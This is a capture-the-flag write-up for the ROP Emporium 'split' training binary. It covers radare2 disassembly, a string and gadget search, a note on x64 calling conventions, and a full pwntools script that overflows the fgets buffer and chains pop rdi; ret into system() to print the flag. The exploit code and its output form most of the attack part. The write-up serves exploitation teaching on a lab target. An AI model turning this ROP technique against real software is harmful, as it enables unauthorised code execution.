# split

In this challenge the elements that allowed you to complete the ret2win challenge are still present, they've just been split apart. Find them and recombine them using a short ROP chain.

```
t0thkr1s@kali ~/D/split> rabin2 -I split 
arch     x86
baddr    0x400000
binsz    7137
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```

## Reverse Engineering

```
t0thkr1s@kali ~/D/split> r2 split 
[0x00400650]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x00400650]> afl
0x00400650    1 41           entry0
0x00400610    1 6            sym.imp.__libc_start_main
0x00400680    4 50   -> 41   sym.deregister_tm_clones
0x004006c0    4 58   -> 55   sym.register_tm_clones
0x00400700    3 28           entry.fini0
0x00400720    4 38   -> 35   entry.init0
0x004007b5    1 82           sym.pwnme
0x00400600    1 6            sym.imp.memset
0x004005d0    1 6            sym.imp.puts
0x004005f0    1 6            sym.imp.printf
0x00400620    1 6            sym.imp.fgets
0x00400807    1 17           sym.usefulFunction
0x004005e0    1 6            sym.imp.system
0x00400890    1 2            sym.__libc_csu_fini
0x00400894    1 9            sym._fini
0x00400820    4 101          sym.__libc_csu_init
0x00400746    1 111          main
0x00400630    1 6            sym.imp.setvbuf
0x004005a0    3 26           sym._init
0x00400048    1 164          fcn.00400048
[0x00400650]> 
```

## Main Function

```
[0x00400650]> s main
[0x00400746]> pdf
            ; DATA XREF from entry0 @ 0x40066d
┌ 111: int main (int argc, char **argv, char **envp);
│           0x00400746      55             push rbp
│           0x00400747      4889e5         mov rbp, rsp
│           0x0040074a      488b052f0920.  mov rax, qword [obj.stdout] ; rdi
│                                                                      ; [0x601080:8]=0
│           0x00400751      b900000000     mov ecx, 0                  ; size_t size
│           0x00400756      ba02000000     mov edx, 2                  ; int mode
│           0x0040075b      be00000000     mov esi, 0                  ; char *buf
│           0x00400760      4889c7         mov rdi, rax                ; FILE*stream
│           0x00400763      e8c8feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x00400768      488b05310920.  mov rax, qword [obj.stderr] ; obj.stderr__GLIBC_2.2.5
│                                                                      ; [0x6010a0:8]=0                                                       
│           0x0040076f      b900000000     mov ecx, 0                  ; size_t size
│           0x00400774      ba02000000     mov edx, 2                  ; int mode
│           0x00400779      be00000000     mov esi, 0                  ; char *buf
│           0x0040077e      4889c7         mov rdi, rax                ; FILE*stream
│           0x00400781      e8aafeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x00400786      bfa8084000     mov edi, str.split_by_ROP_Emporium ; 0x4008a8 ; "split by ROP Emporium" ; const char *s
│           0x0040078b      e840feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400790      bfbe084000     mov edi, str.64bits         ; 0x4008be ; "64bits\n" ; const char *s
│           0x00400795      e836feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040079a      b800000000     mov eax, 0
│           0x0040079f      e811000000     call sym.pwnme
│           0x004007a4      bfc6084000     mov edi, str.Exiting        ; 0x4008c6 ; "\nExiting" ; const char *s
│           0x004007a9      e822feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004007ae      b800000000     mov eax, 0
│           0x004007b3      5d             pop rbp
└           0x004007b4      c3             ret
```

## Pwnme Function

```
[0x004007b5]> pdf
            ; CALL XREF from main @ 0x40079f
┌ 82: sym.pwnme ();
│           ; var char *s @ rbp-0x20
│           0x004007b5      55             push rbp
│           0x004007b6      4889e5         mov rbp, rsp
│           0x004007b9      4883ec20       sub rsp, 0x20
│           0x004007bd      488d45e0       lea rax, qword [s]
│           0x004007c1      ba20000000     mov edx, 0x20               ; 32 ; size_t n
│           0x004007c6      be00000000     mov esi, 0                  ; int c
│           0x004007cb      4889c7         mov rdi, rax                ; void *s
│           0x004007ce      e82dfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x004007d3      bfd0084000     mov edi, str.Contriving_a_reason_to_ask_user_for_data... ; 0x4008d0 ; "Contriving a reason to ask user for data..." ; const char *s                                                                                                              
│           0x004007d8      e8f3fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004007dd      bffc084000     mov edi, 0x4008fc           ; const char *format
│           0x004007e2      b800000000     mov eax, 0
│           0x004007e7      e804feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x004007ec      488b159d0820.  mov rdx, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
│                                                                      ; [0x601090:8]=0 ; FILE *stream                                        
│           0x004007f3      488d45e0       lea rax, qword [s]
│           0x004007f7      be60000000     mov esi, 0x60               ; '`' ; 96 ; int size
│           0x004007fc      4889c7         mov rdi, rax                ; char *s
│           0x004007ff      e81cfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x00400804      90             nop
│           0x00400805      c9             leave
└           0x00400806      c3             ret
```

## UsefulFunction Function

```
[0x004007b5]> s sym.usefulFunction
[0x00400807]> pdf
┌ 17: sym.usefulFunction ();
│           0x00400807      55             push rbp
│           0x00400808      4889e5         mov rbp, rsp
│           0x0040080b      bfff084000     mov edi, str.bin_ls         ; 0x4008ff ; "/bin/ls" ; const char *string
│           0x00400810      e8cbfdffff     call sym.imp.system         ; int system(const char *string)
│           0x00400815      90             nop
│           0x00400816      5d             pop rbp
└           0x00400817      c3             ret
```

## Looking for Strings

```
[0x00400807]> izz
[Strings]
nth paddr      vaddr      len size section   type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000034 0x00000034 4   10             utf16le @8\t@
1   0x00000238 0x00400238 27  28   .interp   ascii   /lib64/ld-linux-x86-64.so.2
2   0x000003e9 0x004003e9 9   10   .dynstr   ascii   libc.so.6
3   0x000003f3 0x004003f3 4   5    .dynstr   ascii   puts
4   0x000003f8 0x004003f8 5   6    .dynstr   ascii   stdin
5   0x000003fe 0x004003fe 6   7    .dynstr   ascii   printf
6   0x00000405 0x00400405 5   6    .dynstr   ascii   fgets
7   0x0000040b 0x0040040b 6   7    .dynstr   ascii   memset
8   0x00000412 0x00400412 6   7    .dynstr   ascii   stdout
9   0x00000419 0x00400419 6   7    .dynstr   ascii   stderr
10  0x00000420 0x00400420 6   7    .dynstr   ascii   system
11  0x00000427 0x00400427 7   8    .dynstr   ascii   setvbuf
12  0x0000042f 0x0040042f 17  18   .dynstr   ascii   __libc_start_main
13  0x00000441 0x00400441 14  15   .dynstr   ascii   __gmon_start__
14  0x00000450 0x00400450 11  12   .dynstr   ascii   GLIBC_2.2.5
15  0x000005c1 0x004005c1 4   5    .plt      ascii   5B\n 
16  0x000005c7 0x004005c7 4   5    .plt      ascii   %D\n 
17  0x000005d1 0x004005d1 4   5    .plt      ascii   %B\n 
18  0x000005e1 0x004005e1 4   5    .plt      ascii   %:\n 
19  0x000005f1 0x004005f1 4   5    .plt      ascii   %2\n 
20  0x00000601 0x00400601 4   5    .plt      ascii   %*\n 
21  0x00000611 0x00400611 4   5    .plt      ascii   %"\n 
22  0x00000820 0x00400820 5   6    .text     ascii   AWAVA
23  0x00000827 0x00400827 5   6    .text     ascii   AUATL
24  0x00000879 0x00400879 14  16   .text     utf8    \b[]A\A]A^A_Ðf. blocks=Basic Latin,Latin-1 Supplement
25  0x000008a8 0x004008a8 21  22   .rodata   ascii   split by ROP Emporium
26  0x000008be 0x004008be 7   8    .rodata   ascii   64bits\n
27  0x000008c6 0x004008c6 8   9    .rodata   ascii   \nExiting
28  0x000008d0 0x004008d0 43  44   .rodata   ascii   Contriving a reason to ask user for data...
29  0x000008ff 0x004008ff 7   8    .rodata   ascii   /bin/ls
30  0x00000960 0x00400960 4   5    .eh_frame ascii   \e\f\a\b
31  0x00000990 0x00400990 4   5    .eh_frame ascii   \e\f\a\b
32  0x000009b7 0x004009b7 5   6    .eh_frame ascii   ;*3$"
33  0x000009da 0x004009da 4   5    .eh_frame ascii   j\f\a\b
34  0x000009fa 0x004009fa 4   5    .eh_frame ascii   M\f\a\b
35  0x00000a19 0x00400a19 4   5    .eh_frame ascii   L\f\a\b
36  0x00001060 0x00601060 17  18   .data     ascii   /bin/cat flag.txt
37  0x0000107a 0x00000000 51  52   .comment  ascii   GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
38  0x00001801 0x00000001 10  11   .strtab   ascii   crtstuff.c
39  0x0000180c 0x0000000c 12  13   .strtab   ascii   __JCR_LIST__
40  0x00001819 0x00000019 20  21   .strtab   ascii   deregister_tm_clones
41  0x0000182e 0x0000002e 21  22   .strtab   ascii   __do_global_dtors_aux
42  0x00001844 0x00000044 14  15   .strtab   ascii   completed.7585
43  0x00001853 0x00000053 38  39   .strtab   ascii   __do_global_dtors_aux_fini_array_entry
44  0x0000187a 0x0000007a 11  12   .strtab   ascii   frame_dummy
45  0x00001886 0x00000086 30  31   .strtab   ascii   __frame_dummy_init_array_entry
46  0x000018a5 0x000000a5 7   8    .strtab   ascii   split.c
47  0x000018ad 0x000000ad 5   6    .strtab   ascii   pwnme
48  0x000018b3 0x000000b3 14  15   .strtab   ascii   usefulFunction
49  0x000018c2 0x000000c2 13  14   .strtab   ascii   __FRAME_END__
50  0x000018d0 0x000000d0 11  12   .strtab   ascii   __JCR_END__
51  0x000018dc 0x000000dc 16  17   .strtab   ascii   __init_array_end
52  0x000018ed 0x000000ed 8   9    .strtab   ascii   _DYNAMIC
53  0x000018f6 0x000000f6 18  19   .strtab   ascii   __init_array_start
54  0x00001909 0x00000109 18  19   .strtab   ascii   __GNU_EH_FRAME_HDR
55  0x0000191c 0x0000011c 21  22   .strtab   ascii   _GLOBAL_OFFSET_TABLE_
56  0x00001932 0x00000132 15  16   .strtab   ascii   __libc_csu_fini
57  0x00001942 0x00000142 27  28   .strtab   ascii   _ITM_deregisterTMCloneTable
58  0x0000195e 0x0000015e 19  20   .strtab   ascii   stdout@@GLIBC_2.2.5
59  0x00001972 0x00000172 17  18   .strtab   ascii   puts@@GLIBC_2.2.5
60  0x00001984 0x00000184 18  19   .strtab   ascii   stdin@@GLIBC_2.2.5
61  0x00001997 0x00000197 6   7    .strtab   ascii   _edata
62  0x0000199e 0x0000019e 19  20   .strtab   ascii   system@@GLIBC_2.2.5
63  0x000019b2 0x000001b2 19  20   .strtab   ascii   printf@@GLIBC_2.2.5
64  0x000019c6 0x000001c6 19  20   .strtab   ascii   memset@@GLIBC_2.2.5
65  0x000019da 0x000001da 30  31   .strtab   ascii   __libc_start_main@@GLIBC_2.2.5
66  0x000019f9 0x000001f9 18  19   .strtab   ascii   fgets@@GLIBC_2.2.5
67  0x00001a0c 0x0000020c 12  13   .strtab   ascii   __data_start
68  0x00001a19 0x00000219 14  15   .strtab   ascii   __gmon_start__
69  0x00001a28 0x00000228 12  13   .strtab   ascii   __dso_handle
70  0x00001a35 0x00000235 14  15   .strtab   ascii   _IO_stdin_used
71  0x00001a44 0x00000244 12  13   .strtab   ascii   usefulString
72  0x00001a51 0x00000251 15  16   .strtab   ascii   __libc_csu_init
73  0x00001a61 0x00000261 11  12   .strtab   ascii   __bss_start
74  0x00001a6d 0x0000026d 4   5    .strtab   ascii   main
75  0x00001a72 0x00000272 20  21   .strtab   ascii   setvbuf@@GLIBC_2.2.5
76  0x00001a87 0x00000287 19  20   .strtab   ascii   _Jv_RegisterClasses
77  0x00001a9b 0x0000029b 11  12   .strtab   ascii   __TMC_END__
78  0x00001aa7 0x000002a7 25  26   .strtab   ascii   _ITM_registerTMCloneTable
79  0x00001ac1 0x000002c1 19  20   .strtab   ascii   stderr@@GLIBC_2.2.5
80  0x00001ad6 0x00000001 7   8    .shstrtab ascii   .symtab
81  0x00001ade 0x00000009 7   8    .shstrtab ascii   .strtab
82  0x00001ae6 0x00000011 9   10   .shstrtab ascii   .shstrtab
83  0x00001af0 0x0000001b 7   8    .shstrtab ascii   .interp
84  0x00001af8 0x00000023 13  14   .shstrtab ascii   .note.ABI-tag
85  0x00001b06 0x00000031 18  19   .shstrtab ascii   .note.gnu.build-id
86  0x00001b19 0x00000044 9   10   .shstrtab ascii   .gnu.hash
87  0x00001b23 0x0000004e 7   8    .shstrtab ascii   .dynsym
88  0x00001b2b 0x00000056 7   8    .shstrtab ascii   .dynstr
89  0x00001b33 0x0000005e 12  13   .shstrtab ascii   .gnu.version
90  0x00001b40 0x0000006b 14  15   .shstrtab ascii   .gnu.version_r
91  0x00001b4f 0x0000007a 9   10   .shstrtab ascii   .rela.dyn
92  0x00001b59 0x00000084 9   10   .shstrtab ascii   .rela.plt
93  0x00001b63 0x0000008e 5   6    .shstrtab ascii   .init
94  0x00001b69 0x00000094 8   9    .shstrtab ascii   .plt.got
95  0x00001b72 0x0000009d 5   6    .shstrtab ascii   .text
96  0x00001b78 0x000000a3 5   6    .shstrtab ascii   .fini
97  0x00001b7e 0x000000a9 7   8    .shstrtab ascii   .rodata
98  0x00001b86 0x000000b1 13  14   .shstrtab ascii   .eh_frame_hdr
99  0x00001b94 0x000000bf 9   10   .shstrtab ascii   .eh_frame
100 0x00001b9e 0x000000c9 11  12   .shstrtab ascii   .init_array
101 0x00001baa 0x000000d5 11  12   .shstrtab ascii   .fini_array
102 0x00001bb6 0x000000e1 4   5    .shstrtab ascii   .jcr
103 0x00001bbb 0x000000e6 8   9    .shstrtab ascii   .dynamic
104 0x00001bc4 0x000000ef 8   9    .shstrtab ascii   .got.plt
105 0x00001bcd 0x000000f8 5   6    .shstrtab ascii   .data
106 0x00001bd3 0x000000fe 4   5    .shstrtab ascii   .bss
107 0x00001bd8 0x00000103 8   9    .shstrtab ascii   .comment

[0x00400807]>
[0x00400807]> s 0x00601060
[0x00601060]> xx
- offset -   0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF
0x00601060  /bin/cat flag.txt...............................................                                                                  
0x006010a0  ................................................................
0x006010e0  ................................................................
0x00601120  ................................................................
```

Calling Conventions
In case you aren’t familiar with x86 or x64, Here is a short summary of the different ways they call functions. Both have multiple conventions, but for brevity i’ll only cover the two that are the most common.

**x86 - cdecl**: Arguments to a function are pushed to the stack in reverse order (right to left). The function then pops it’s arguments off the stack and does its work. It is irrelevant for this challenge, but it’s worth noting that cdecl is a caller save convention, meaning that the caller has to clean up after the function, ie the function does not clean up its own stack.

**x64 — pass by register**: In x64 there are many more registers available to use. It is also much faster to load a value to a register than to push a value to the stack. For this reason, arguments to functions in x64 are passed in registers RDI, RSI, RDX, R10, R8, and R9, With the first argument in RDI, the second in RSI, and so on.

Since this article is exploring the x64 *split* binary, we can see that we need to pass our single argument to *system()* in the RDI register.

## ROPGadget

```
t0thkr1s@kali ~/D/s/ROPgadget (master)> ./ROPgadget.py --binary ../split --string "/bin/cat flag.txt"
Strings information
============================================================
0x0000000000601060 : /bin/cat flag.txt
```

```
t0thkr1s@kali ~> msf-nasm_shell 64
nasm > pop rdi
00000000  5F                pop rdi
nasm > ret
00000000  C3                ret
nasm >
```

```
t0thkr1s@kali ~/D/s/ROPgadget (master)> ./ROPgadget.py --binary ../split
Gadgets information
============================================================
0x00000000004006a2 : adc byte ptr [rax], ah ; jmp rax
0x0000000000400632 : adc cl, byte ptr [rdx] ; and byte ptr [rax], al ; push 6 ; jmp 0x4005c9
0x0000000000400617 : add al, 0 ; add byte ptr [rax], al ; jmp 0x4005c4
0x000000000040080e : add al, bpl ; retf
0x00000000004005f7 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x4005c4
0x000000000040080f : add al, ch ; retf
0x000000000040088f : add bl, dh ; ret
0x000000000040088d : add byte ptr [rax], al ; add bl, dh ; ret
0x000000000040088b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004005d7 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4005c4
0x00000000004006ac : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040088c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004005b3 : add byte ptr [rax], al ; add rsp, 8 ; ret
0x00000000004005d9 : add byte ptr [rax], al ; jmp 0x4005c2
0x00000000004006ae : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040088e : add byte ptr [rax], al ; ret
0x0000000000400728 : add byte ptr [rbp + 5], dh ; jmp 0x4006c3
0x0000000000400718 : add byte ptr [rcx], al ; ret
0x0000000000400870 : add dword ptr [rax + 0x39], ecx ; jmp 0x4008ed
0x00000000004005e7 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x4005c4
0x0000000000400714 : add eax, 0x20098e ; add ebx, esi ; ret
0x0000000000400607 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x4005c4
0x0000000000400719 : add ebx, esi ; ret
0x00000000004005b6 : add esp, 8 ; ret
0x00000000004005b5 : add rsp, 8 ; ret
0x0000000000400717 : and byte ptr [rax], al ; add ebx, esi ; ret
0x00000000004005d4 : and byte ptr [rax], al ; push 0 ; jmp 0x4005c7
0x00000000004005e4 : and byte ptr [rax], al ; push 1 ; jmp 0x4005c7
0x00000000004005f4 : and byte ptr [rax], al ; push 2 ; jmp 0x4005c7
0x0000000000400604 : and byte ptr [rax], al ; push 3 ; jmp 0x4005c7
0x0000000000400614 : and byte ptr [rax], al ; push 4 ; jmp 0x4005c7
0x0000000000400624 : and byte ptr [rax], al ; push 5 ; jmp 0x4005c7
0x0000000000400634 : and byte ptr [rax], al ; push 6 ; jmp 0x4005c7
0x0000000000400612 : and cl, byte ptr [rdx] ; and byte ptr [rax], al ; push 4 ; jmp 0x4005c9
0x0000000000400a0b : call qword ptr [rcx]
0x000000000040073e : call rax
0x00000000004005e2 : cmp cl, byte ptr [rdx] ; and byte ptr [rax], al ; push 1 ; jmp 0x4005c9
0x0000000000400726 : cmp dword ptr [rdi], 0 ; jne 0x400735 ; jmp 0x4006c5
0x0000000000400725 : cmp qword ptr [rdi], 0 ; jne 0x400736 ; jmp 0x4006c6
0x000000000040080c : dec dword ptr [rax] ; add al, bpl ; retf
0x000000000040086c : fmul qword ptr [rax - 0x7d] ; ret
0x000000000040080a : in eax, 0xbf ; dec dword ptr [rax] ; add al, bpl ; retf
0x0000000000400739 : int1 ; push rbp ; mov rbp, rsp ; call rax
0x000000000040069d : je 0x4006b8 ; pop rbp ; mov edi, 0x601080 ; jmp rax
0x00000000004006eb : je 0x400700 ; pop rbp ; mov edi, 0x601080 ; jmp rax
0x0000000000400738 : je 0x400731 ; push rbp ; mov rbp, rsp ; call rax
0x00000000004005db : jmp 0x4005c0
0x000000000040072b : jmp 0x4006c0
0x0000000000400873 : jmp 0x4008ea
0x00000000004006a5 : jmp rax
0x0000000000400729 : jne 0x400732 ; jmp 0x4006c2
0x0000000000400805 : leave ; ret
0x0000000000400713 : mov byte ptr [rip + 0x20098e], 1 ; ret
0x0000000000400715 : mov cs, word ptr [rcx] ; and byte ptr [rax], al ; add ebx, esi ; ret
0x00000000004007ae : mov eax, 0 ; pop rbp ; ret
0x00000000004005b1 : mov eax, dword ptr [rax] ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x000000000040073c : mov ebp, esp ; call rax
0x00000000004006a0 : mov edi, 0x601080 ; jmp rax
0x000000000040073b : mov rbp, rsp ; call rax
0x0000000000400804 : nop ; leave ; ret
0x0000000000400815 : nop ; pop rbp ; ret
0x00000000004006a8 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x0000000000400888 : nop dword ptr [rax + rax] ; ret
0x00000000004006f5 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400716 : or dword ptr [rax], esp ; add byte ptr [rcx], al ; ret
0x000000000040087c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040087e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400880 : pop r14 ; pop r15 ; ret
0x0000000000400882 : pop r15 ; ret
0x0000000000400740 : pop rbp ; jmp 0x4006c1
0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20098e], 1 ; ret
0x000000000040069f : pop rbp ; mov edi, 0x601080 ; jmp rax
0x000000000040087b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040087f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004006b0 : pop rbp ; ret
0x0000000000400883 : pop rdi ; ret
0x0000000000400881 : pop rsi ; pop r15 ; ret
0x000000000040087d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004005d6 : push 0 ; jmp 0x4005c5
0x00000000004005e6 : push 1 ; jmp 0x4005c5
0x00000000004005f6 : push 2 ; jmp 0x4005c5
0x0000000000400606 : push 3 ; jmp 0x4005c5
0x0000000000400616 : push 4 ; jmp 0x4005c5
0x0000000000400626 : push 5 ; jmp 0x4005c5
0x0000000000400636 : push 6 ; jmp 0x4005c5
0x000000000040073a : push rbp ; mov rbp, rsp ; call rax
0x00000000004005b9 : ret
0x0000000000400811 : retf
0x0000000000400737 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax
0x0000000000400622 : sbb cl, byte ptr [rdx] ; and byte ptr [rax], al ; push 5 ; jmp 0x4005c9
0x0000000000400602 : sub cl, byte ptr [rdx] ; and byte ptr [rax], al ; push 3 ; jmp 0x4005c9
0x0000000000400895 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000400894 : sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004006aa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040088a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000400736 : test eax, eax ; je 0x400733 ; push rbp ; mov rbp, rsp ; call rax
0x0000000000400735 : test rax, rax ; je 0x400734 ; push rbp ; mov rbp, rsp ; call rax
0x00000000004005f2 : xor cl, byte ptr [rdx] ; and byte ptr [rax], al ; push 2 ; jmp 0x4005c9

Unique gadgets found: 98
t0thkr1s@kali ~/D/s/ROPgadget (master)> ./ROPgadget.py --binary ../split --opcode "5FC3"
Opcodes information
============================================================
0x0000000000400883 : 5FC3
```

## Exploitation

Finally, we’re ready to actually exploit our findings. Our plan of attack is now:

1. Find an offset into the *fgets()* buffer that lets us overwrite the return address of the *pwnme()* function. We’ll cover this in the next section.

2. Set up a ROP Chain that puts the address of the ‘/bin/cat flag.txt’ string we found during the reconnaissance phase into the RDI register, Which will become the argument to system().

3. Finally, call *system()* by returning into it.

```python3
#!/usr/bin/env python3
from pwn import *

binary = ELF('split')

io = process(binary.path)
print(io.recv())
io.sendline(cyclic(100))
io.wait()

core = io.corefile
stack = core.rsp

info("Stack pointer: %#x", stack)
pattern = core.read(stack, 4)
info("Looking for pattern: %r", pattern)
offset = cyclic_find(pattern)
info("Offset: " + str(offset))

pop_rdi_ret = p64(0x00400883)
print_flag = p64(0x00601060)
system = p64(0x00400810)

rop_chain = pop_rdi_ret
rop_chain += print_flag
rop_chain += system

# rop = ROP(binary)
# rop.system(print_flag)
# info(rop.dump())
# overflow = cyclic(offset) + rop.chain()

# overflow structure = padding + rop chain
overflow = cyclic(offset) + rop_chain
process = binary.process()
print(process.recv().decode())
info('Sending payload...')
process.sendline(overflow)
print(process.recvall().decode())
```

```
t0thkr1s@kali ~/D/split> python3 exploit.py
[*] '/home/t0thkr1s/Downloads/split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/t0thkr1s/Downloads/split/split': pid 6778
b'split by ROP Emporium'
[*] Process '/home/t0thkr1s/Downloads/split/split' stopped with exit code -11 (SIGSEGV) (pid 6778)
[+] Parsing corefile...: Done
[*] '/home/t0thkr1s/Downloads/split/core.6778'
    Arch:      amd64-64-little
    RIP:       0x400806
    RSP:       0x7ffc9f3b5638
    Exe:       '/home/t0thkr1s/Downloads/split/split' (0x400000)
[*] Stack pointer: 0x7ffc9f3b5638
[*] Looking for pattern: b'kaaa'
[*] Offset: 40
[+] Starting local process '/home/t0thkr1s/Downloads/split/split': pid 6781
split by ROP Emporium
[*] Sending payload...
[+] Receiving all data: Done (88B)
[*] Stopped process '/home/t0thkr1s/Downloads/split/split' (pid 6781)

64bits

Contriving a reason to ask user for data...
> ROPE{a_placeholder_32byte_flag!}
```

> ROPE{a_placeholder_32byte_flag!}
